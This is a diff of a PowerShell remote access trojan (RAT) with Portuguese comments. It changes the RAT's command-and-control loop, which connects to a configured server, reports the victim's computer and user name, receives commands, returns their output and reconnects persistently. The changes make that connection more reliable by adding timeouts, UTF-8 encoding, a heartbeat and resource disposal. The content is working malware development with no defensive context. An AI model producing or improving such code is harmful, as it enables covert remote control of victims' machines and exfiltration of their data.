@@ -641,26 +641,24 @@ function Uninstall-RAT {
     }
 }
 
-# ===== CONEXAO PRINCIPAL =====
+# ===== CONEXAO PRINCIPAL (CORRIGIDA) =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient
-        $client.ReceiveTimeout = 0
-        $client.SendTimeout = 0
+        $client.ReceiveTimeout = 30000
+        $client.SendTimeout = 30000
         
         $client.Connect($serverIP, $serverPort)
         
         $stream = $client.GetStream()
-        $stream.ReadTimeout = 0
-        $stream.WriteTimeout = 5000
-        
-        $writer = New-Object System.IO.StreamWriter($stream)
-        $reader = New-Object System.IO.StreamReader($stream)
+        $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::UTF8)
+        $reader = New-Object System.IO.StreamReader($stream, [System.Text.Encoding]::UTF8)
         $writer.AutoFlush = $true
         
+        # ENVIA IDENTIFICAÇÃO
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
-        while ($true) {
+        while ($client.Connected) {
             try {
                 if ($stream.DataAvailable) {
                     $cmd = $reader.ReadLine()
@@ -733,9 +731,11 @@ while ($true) {
                         }
                     }
                     
+                    # ENVIA RESPOSTA COM ENCODING UTF8
                     if (-not [string]::IsNullOrEmpty($response)) {
                         try {
                             $writer.WriteLine($response)
+                            $writer.Flush()
                         } catch {
                             break
                         }
@@ -744,7 +744,15 @@ while ($true) {
                     Start-Sleep -Milliseconds 100
                 }
                 
+                # VERIFICA SE AINDA ESTÁ CONECTADO
                 if (-not $client.Connected) {
+                    break
+                }
+                
+                # HEARTBEAT
+                try {
+                    $client.Client.Send([byte[]](0x00), 0, [System.Net.Sockets.SocketFlags]::None)
+                } catch {
                     break
                 }
                 
@@ -755,12 +763,13 @@ while ($true) {
         
     } catch {
     } finally {
-        if ($reader) { try { $reader.Close() } catch {} }
-        if ($writer) { try { $writer.Close() } catch {} }
-        if ($stream) { try { $stream.Close() } catch {} }
-        if ($client) { try { $client.Close() } catch {} }
+        if ($reader) { try { $reader.Close(); $reader.Dispose() } catch {} }
+        if ($writer) { try { $writer.Close(); $writer.Dispose() } catch {} }
+        if ($stream) { try { $stream.Close(); $stream.Dispose() } catch {} }
+        if ($client) { try { $client.Close(); $client.Dispose() } catch {} }
     }
     
+    # AGUARDA 5 SEGUNDOS ANTES DE TENTAR RECONECTAR
     Start-Sleep -Seconds 5
 }
 
